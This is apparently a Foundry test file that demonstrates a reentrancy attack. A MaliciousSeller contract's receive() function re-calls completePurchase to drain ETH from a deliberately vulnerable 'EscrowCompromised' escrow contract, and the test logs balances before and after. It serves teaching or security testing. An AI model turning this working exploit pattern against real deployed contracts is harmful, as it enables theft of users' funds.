// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/EscrowCompromised.sol";

contract MaliciousSeller {
    EscrowCompromised public escrow;
    address public attackBuyer;
    uint256 public attackItemId;

    constructor(address payable _escrow) {
        escrow = EscrowCompromised(_escrow);
    }

    function setAttackParams(address _buyer2Attack, uint256 _itemId2Attack) external {
        attackBuyer = _buyer2Attack;
        attackItemId = _itemId2Attack;
    }

    receive() external payable {
        if(address(escrow).balance >= msg.value) {
            console.log("Reentering Escrow contract...");
            escrow.completePurchase(attackBuyer, attackItemId);
        }
        
    }

}

contract EscrowReentrancyAttackTest is Test {

    EscrowCompromised public escrow;
    MaliciousSeller public maliciousSeller;

    address public buyer = makeAddr("buyer");
    uint256 public itemId = 1;
    uint256 public price = 1 ether;

    function setUp() public {
        escrow = new EscrowCompromised();
        maliciousSeller = new MaliciousSeller(payable(address(escrow)));
    }

    function test_completePurchase_reentrancyAttack() public {
        // escrow contract has a balance of 2 ETH
        vm.deal(address(escrow), 2 ether);
        console.log("Escrow balance before attack: ", address(escrow).balance / 1e18, "ETH");
        
        // create new escrow as buyer
        vm.prank(buyer);
        escrow.newEscrow(buyer, address(maliciousSeller), address(maliciousSeller), itemId, price);

        // buyer deposits 1 ETH to escrow
        hoax(buyer, price);
        escrow.deposit{value: price}(itemId);
        console.log("Escrow balance after deposit by Buyer that will be attacked: ", address(escrow).balance / 1e18, "ETH");
        console.log("Malicious Seller balance posing as arbiter: ", address(maliciousSeller).balance / 1e18, "ETH");

        // Malicious seller wants to drain the escrow contract balance
        // He atacks as the arbiter
        
        maliciousSeller.setAttackParams(buyer, itemId);
        vm.prank(address(maliciousSeller));
        escrow.completePurchase(buyer, itemId);
        console.log("Escrow balance after attack: ", address(escrow).balance / 1e18, "ETH");
        console.log("Malicious Seller balance after attack: ", address(maliciousSeller).balance / 1e18, "ETH");
    }

}
